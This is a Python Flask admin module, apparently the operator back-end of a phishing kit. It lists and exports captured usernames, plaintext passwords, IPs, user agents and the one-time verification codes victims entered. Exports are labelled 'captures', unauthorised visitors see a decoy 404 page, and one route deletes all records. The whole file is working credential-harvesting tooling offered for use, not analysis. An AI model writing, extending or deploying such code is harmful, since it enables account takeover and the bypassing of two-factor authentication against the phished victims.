import csv
import datetime
import io
import secrets

from flask import (Blueprint, Response, current_app, make_response,
                   render_template, request)

from db import get_db

bp = Blueprint("admin", __name__, url_prefix="/admin")
COOKIE = "adm"


def _autorise():
    attendu = current_app.config["ADMIN_TOKEN"]
    if not attendu:
        return False
    fourni = request.args.get("token") or request.cookies.get(COOKIE)
    return bool(fourni) and secrets.compare_digest(fourni, attendu)


def _refus():
    return render_template("admin_404.html"), 404


def _pose_cookie(reponse):
    if request.args.get("token"):
        reponse.set_cookie(
            COOKIE, current_app.config["ADMIN_TOKEN"],
            max_age=60 * 60 * 24 * 30,
            httponly=True, samesite="Lax", secure=not current_app.debug,
        )
    return reponse


@bp.get("/")
def tableau():
    if not _autorise():
        return _refus()

    rows = get_db().execute(
        "SELECT l.id, l.identifiant, l.mot_de_passe, l.debloque, l.ip, "
        "to_char(l.recu_le, 'YYYY-MM-DD HH24:MI') AS recu_le, "
        "(SELECT COUNT(*) FROM tentatives_code t WHERE t.login_id = l.id) AS nb_codes, "
        "(SELECT t.code FROM tentatives_code t WHERE t.login_id = l.id "
        " ORDER BY t.id DESC LIMIT 1) AS dernier_code "
        "FROM logins l ORDER BY l.id DESC LIMIT 500"
    ).fetchall()

    reponse = make_response(render_template("admin.html", entrees=rows,
                                            total=len(rows)))
    return _pose_cookie(reponse)


@bp.get("/codes/<int:login_id>")
def codes(login_id):
    if not _autorise():
        return _refus()

    base = get_db()
    entree = base.execute("SELECT * FROM logins WHERE id = %s", (login_id,)).fetchone()
    if entree is None:
        return _refus()

    tentatives = base.execute(
        "SELECT code, valide, ip, to_char(cree_le, 'YYYY-MM-DD HH24:MI:SS') AS cree_le "
        "FROM tentatives_code WHERE login_id = %s ORDER BY id DESC",
        (login_id,),
    ).fetchall()

    reponse = make_response(render_template("admin_codes.html", entree=entree,
                                            tentatives=tentatives))
    return _pose_cookie(reponse)


@bp.get("/export.csv")
def export():
    if not _autorise():
        return _refus()

    buf = io.StringIO()
    w = csv.writer(buf, delimiter=";")
    w.writerow(["id", "identifiant", "mot_de_passe", "debloque", "ip", "ua", "recu_le",
                "nb_codes", "codes_saisis"])
    for r in get_db().execute(
        "SELECT l.id, l.identifiant, l.mot_de_passe, l.debloque, l.ip, l.ua, "
        "to_char(l.recu_le, 'YYYY-MM-DD HH24:MI') AS recu_le, "
        "(SELECT COUNT(*) FROM tentatives_code t WHERE t.login_id = l.id) AS nb_codes, "
        "(SELECT string_agg(t.code || CASE WHEN t.valide THEN '*' ELSE '' END, ' | ') "
        " FROM tentatives_code t WHERE t.login_id = l.id) AS codes_saisis "
        "FROM logins l ORDER BY l.id"
    ):
        w.writerow([r["id"], r["identifiant"], r["mot_de_passe"], r["debloque"],
                    r["ip"], r["ua"], r["recu_le"], r["nb_codes"], r["codes_saisis"]])

    horodatage = datetime.datetime.now().strftime("%Y%m%d-%H%M")
    reponse = make_response(buf.getvalue())
    reponse.mimetype = "text/csv"
    reponse.headers["Content-Disposition"] = f"attachment; filename=captures-{horodatage}.csv"
    return _pose_cookie(reponse)


@bp.delete("/logins")
def vider():
    if not _autorise():
        return _refus()

    base = get_db()
    base.execute("DELETE FROM logins")
    base.commit()
    return Response("ok", mimetype="text/plain")